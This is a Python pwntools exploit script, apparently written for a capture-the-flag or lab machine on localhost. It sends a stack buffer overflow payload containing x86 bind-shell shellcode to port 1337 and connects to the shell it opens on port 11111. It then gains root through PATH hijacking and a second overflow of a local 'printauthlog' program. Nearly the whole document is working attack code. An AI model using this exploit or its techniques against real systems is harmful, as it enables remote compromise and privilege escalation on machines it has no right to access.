from pwn import *

context(os='linux', arch='amd64')

target = "127.0.0.1"
s = remote(target, 1337)

jmpesp = p32(0x0804928d)
offset = 'A'*35
# bind shell 11111
shellcode  = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
shellcode += "\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68"
shellcode += "\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1"
shellcode += "\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd"
shellcode += "\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"
shellcode += "\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"
shellcode += "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
shellcode += "\x41\xcd\x80"
nop = '\x90'*10
log.info("Crafting payload ...")
payload = "OVERFLOW " + offset + jmpesp + nop + shellcode
log.info("Send to {}:{}".format(target, "1337"))
s.sendline(payload)
s.recv(1024)
s.close()
log.info("Checking bind shell")
try:
	p = connect(target, 11111)
	log.info("Found, access the shell")
	#p.interactive()
except:
	log.info("Not Found :(")

# add mortal root ?
p.send("""export PATH=.:$PATH
echo 'int main(){setuid(0);setgid(0);system("/bin/sh");}' > Wrong.c;gcc Wrong.c -o Wrong
./printauthlog $(perl -e 'print "{}"')
""".format('A'*68+ p32(0x08049060) + 'B'*4 + p32(0x0804a00e)))
log.success("Priviledge to root!")
p.interactive()